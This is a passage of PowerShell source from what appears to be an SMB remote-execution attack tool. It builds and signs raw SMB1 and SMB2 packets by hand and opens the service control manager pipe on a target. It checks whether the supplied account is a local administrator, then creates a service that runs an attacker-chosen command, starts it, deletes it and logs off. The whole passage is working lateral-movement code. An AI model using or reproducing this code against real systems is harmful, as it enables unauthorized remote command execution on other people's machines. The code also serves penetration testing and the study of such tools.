                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CheckAccess'           
                    }

                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $SMB_client_receive[88..107]

                            if($SMB_execute)
                            {
                                Write-Verbose ""$output_username is a local administrator on $Target""  
                                $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $SMB_client_stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $SMB_client_stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output ""$output_username is a local administrator on $Target""
                                $SMB_close_service_handle_stage = 2
                                $SMB_client_stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output ""$output_username is not a local administrator or does not have required privilege on $Target""
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output ""Something went wrong with $Target""
                            $SMBExec_failed = $true
                        }

                    }
                
                    'CreateServiceW'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = Get-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data[""RPCRequest_AllocHint""] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = Get-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data[""RPCRequest_AllocHint""] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = Get-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Verbose ""Service $SMB_service created on $Target""
                            $SMB_service_context_handle = $SMB_client_receive[92..111]
                            $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            Write-Verbose ""Trying to execute command on $Target""
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadAndXRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '31-04-00-00')
                        {
                            Write-Output ""Service $SMB_service creation failed on $Target""
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output ""Service creation fault context mismatch""
                            $SMBExec_failed = $true
                        }
    
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output ""Command executed with service $SMB_service on $Target""
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output ""Service $SMB_service failed to start on $Target""
                        }

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {
                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose ""Service $SMB_service deleted on $Target""
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }
                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = Get-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header[""SMBHeader_Flags2""] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = Get-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header[""SMBHeader_Signature""] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
            
                if($SMBExec_failed)
                {
                    BREAK SMB_execute_loop
                }
            
            }

        }  
        else
        {
            
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch ($SMB_client_stage)
                {
            
                    'TreeConnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x03,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateRequest'
                    }
                  
                    'CreateRequest'
                    {
                        $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x05,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data[""SMB2CreateRequestFile_Share_Access""] = 0x07,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
                
                    'RPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
